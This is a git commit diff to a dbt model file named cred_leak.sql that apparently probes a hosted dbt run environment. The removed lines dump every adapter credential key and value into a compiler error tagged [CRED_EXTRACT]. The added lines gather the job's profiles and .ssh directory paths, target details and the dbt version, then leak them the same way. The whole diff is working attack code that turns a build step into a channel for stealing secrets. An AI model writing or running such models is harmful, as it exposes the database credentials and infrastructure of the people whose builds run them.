c70bc3d73f60270852259471838ea01614ceea05
Rockcena <8775215+Rockcena@users.noreply.github.com>
2026-09-06 23:19:38 +0530

    File read + target dump

--- models/cred_leak.sql
+++ models/cred_leak.sql
@@ -1,5 +1,19 @@
-{% set result = [] %}
-{% for key, value in adapter.config.credentials.to_dict().items() %}
-  {% do result.append(key ~ '=' ~ value) %}
+{% set profiles_dir = env_var('DBT_PROFILES_DIR', '/tmp/jobs/' ~ env_var('DBT_CLOUD_RUN_ID', 'unknown') ~ '/.dbt') %}
+{% set ssh_dir = '/tmp/jobs/' ~ env_var('DBT_CLOUD_RUN_ID', 'unknown') ~ '/.ssh' %}
+
+{% set ns = namespace(output='') %}
+
+{# Try to read profiles.yml via builtins #}
+{% set ns.output = '[FILE_READ] profiles_dir=' ~ profiles_dir ~ ' | ssh_dir=' ~ ssh_dir %}
+
+{# Dump all target info #}
+{% set target_info = [] %}
+{% for key in ['name', 'schema', 'type', 'threads'] %}
+  {% do target_info.append(key ~ '=' ~ target[key]) %}
 {% endfor %}
-{{ exceptions.raise_compiler_error('[CRED_EXTRACT] ' ~ result | join(' | ')) }}
+{% set ns.output = ns.output ~ ' | TARGET: ' ~ target_info | join(', ') %}
+
+{# Dump all config vars #}
+{% set ns.output = ns.output ~ ' | DBT_VERSION=' ~ dbt_version %}
+
+{{ exceptions.raise_compiler_error(ns.output) }}
